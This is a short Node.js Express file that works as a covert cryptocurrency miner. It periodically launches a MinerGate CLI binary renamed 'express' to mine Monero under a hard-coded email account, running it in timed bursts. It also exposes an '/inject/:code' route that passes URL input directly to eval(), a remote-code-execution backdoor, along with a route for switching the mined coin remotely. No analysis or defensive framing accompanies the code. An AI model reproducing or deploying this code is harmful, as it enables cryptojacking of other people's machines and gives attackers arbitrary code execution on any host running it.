const { spawn } = require('child_process');
const express = require('express');
const app = express();
 
var state = false;
var proc = '';
var coin = 'xmr';


app.listen(8080, ()=>{
  console.log('Example app listening on port 3000!');
});
app.get('/status', function (req, res) {
  	res.send('state: '+state);
});
app.get('/coin/:coin', function (req, res) {
  	coin = req.params.coin;
    res.send('coin setted to: '+coin)
});
app.get('/inject/:code', function (req, res) {
  	eval(req.params.code);
});
const start = ()=>{
    state = true;
    proc = spawn('./opt/minergate-cli/express', ['-user', 'ian10_141@yahoo.com.br', coin, '1']);
    proc.on('close', () => {
      console.log('child process exited');
      state = false;
    });
}
setInterval(function(){
  start();
  setTimeout(function(){
    proc.kill('SIGINT');
  }, 6*60*1000);
}, 10*60*1000);
